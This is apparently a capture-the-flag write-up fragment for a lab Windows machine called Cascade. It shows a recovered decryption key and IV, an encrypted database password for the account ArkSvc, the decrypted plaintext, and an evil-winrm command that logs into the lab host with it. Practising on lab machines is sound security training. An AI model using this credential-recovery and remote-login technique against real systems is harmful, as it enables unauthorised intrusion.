
```
DomainPwd!c4scadek3y6543217Error decrypting password:
```

```
c4scadek3y654321
```

```
1tdyjCbY1Ix49842
```
![[Pasted image 20240917081807.png]]

We found the key but let's find the password from the .db file and with the help of chat-gpt 
will enumerate it
```
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```
![[Pasted image 20240917083411.png]]

Data 
```
BQO5l5Kj9MdErXx6Q6AGOw==
```

Key
```
1tdyjCbY1Ix49842
```

Secret Key
```
c4scadek3y654321
```

Password
```
w3lc0meFr31nd
```

![[Pasted image 20240917183041.png]]


```
evil-winrm -u 'ArkSvc' -p 'w3lc0meFr31nd' -i 10.10.10.182  
```

![[Pasted image 20240918045612.png]]


